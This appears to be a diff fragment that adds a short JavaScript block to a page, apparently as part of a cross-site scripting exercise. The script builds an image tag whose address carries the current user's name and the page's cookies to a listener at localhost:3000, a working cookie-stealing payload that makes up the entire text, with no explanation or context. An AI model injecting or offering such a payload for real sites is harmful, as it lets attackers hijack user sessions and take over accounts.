@@ -1,0 +1,6 @@
+<script> 
+document.write("<img src= \'http://localhost:3000/?" 
++ "user=" 
++ document.getElementById("current_user").innerText 
++ "&" + document.cookie+"\'>")
+</script>
